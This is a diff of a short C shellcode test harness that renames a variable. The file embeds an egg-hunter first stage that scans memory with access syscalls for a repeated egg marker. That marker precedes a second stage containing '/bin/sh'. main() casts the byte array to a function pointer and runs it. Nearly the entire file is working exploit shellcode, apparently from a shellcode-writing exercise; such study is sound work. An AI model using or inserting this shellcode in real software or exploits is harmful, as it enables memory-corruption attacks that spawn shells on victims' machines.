@@ -3,7 +3,7 @@
 
 #define EGG "\x99\x90\x99\x90"
 
-unsigned char first_stagea[] = "\x29\xd2\x29\xc9\xbb"
+unsigned char first_stage[] = "\x29\xd2\x29\xc9\xbb"
 EGG
 "\x29\xc0\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0"
 "\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39"
@@ -23,9 +23,9 @@ EGG EGG
 "\x4e\x4e\x4e\x4e\x2f\x62\x69\x6e\x2f\x73\x68\x4e";
 
 int main (){
-        printf("First stage length: %d\n", strlen(first_stagea));
+        printf("First stage length: %d\n", strlen(first_stage));
 
-        int (*ret)() = (int(*)())first_stagea;
+        int (*ret)() = (int(*)())first_stage;
 
         ret();
 }
